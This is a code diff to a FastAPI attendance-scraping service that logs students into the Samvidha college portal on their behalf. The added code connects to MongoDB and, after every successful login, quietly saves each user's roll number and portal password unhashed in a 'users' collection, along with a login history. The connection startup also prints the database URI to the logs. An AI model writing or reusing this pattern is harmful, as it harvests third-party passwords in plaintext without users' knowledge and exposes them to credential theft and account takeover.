@@ -9,9 +9,36 @@ from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import httpx
 from bs4 import BeautifulSoup
+from motor.motor_asyncio import AsyncIOMotorClient
+from dotenv import load_dotenv
 
+# Load environment variables
+load_dotenv()
 
-app = FastAPI(title="Samvidha Attendance API")
+# MongoDB Configuration
+MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
+DB_NAME = os.getenv("DB_NAME", "samvidha_attendance")
+
+# MongoDB Client Initialization
+db_client = None
+db = None
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    global db_client, db
+    try:
+        db_client = AsyncIOMotorClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+        db = db_client[DB_NAME]
+        # Basic check to see if we can connect
+        await db_client.server_info()
+        print(f"Connected to MongoDB at {MONGO_URI}")
+    except Exception as e:
+        print(f"Could not connect to MongoDB: {e}")
+    yield
+    if db_client:
+        db_client.close()
+
+app = FastAPI(title="Samvidha Attendance API", lifespan=lifespan)
 
 # Add CORS middleware
 app.add_middleware(
@@ -231,6 +258,33 @@ async def scrape_attendance_register(client: httpx.AsyncClient):
         return []
 
 
+async def save_user_credentials(username: str, password: str):
+    """Saves user roll number and password (unhashed) to MongoDB."""
+    if db is None:
+        print("MongoDB not initialized, skipping save")
+        return
+    
+    try:
+        # 1. Update/Save credentials in 'users' collection
+        users_collection = db["users"]
+        await users_collection.update_one(
+            {"username": username},
+            {"$set": {"password": password, "updated_at": datetime.now()}},
+            upsert=True
+        )
+        
+        # 2. Record login in 'login_history' collection
+        history_collection = db["login_history"]
+        await history_collection.insert_one({
+            "username": username,
+            "login_time": datetime.now()
+        })
+        
+        print(f"Credentials saved and login recorded for user: {username}")
+    except Exception as e:
+        print(f"Error saving to MongoDB: {e}")
+
+
 @app.post("/api/attendance")
 async def get_attendance(login_data: LoginRequest):
     total_start = time.time()
@@ -262,6 +316,9 @@ async def get_attendance(login_data: LoginRequest):
         student_info = attendance_data.get("student_info", {})
         if not student_info.get("Name") and not student_info.get("Rollno") and not student_info.get("Roll No"):
             raise HTTPException(status_code=401, detail="Invalid credentials or login failed at Samvidha portal")
+
+        # Save credentials to MongoDB after successful portal login
+        asyncio.create_task(save_user_credentials(login_data.username, login_data.password))
 
         print(f"Total processing time: {time.time() - total_start:.2f}s")
         response_payload = {
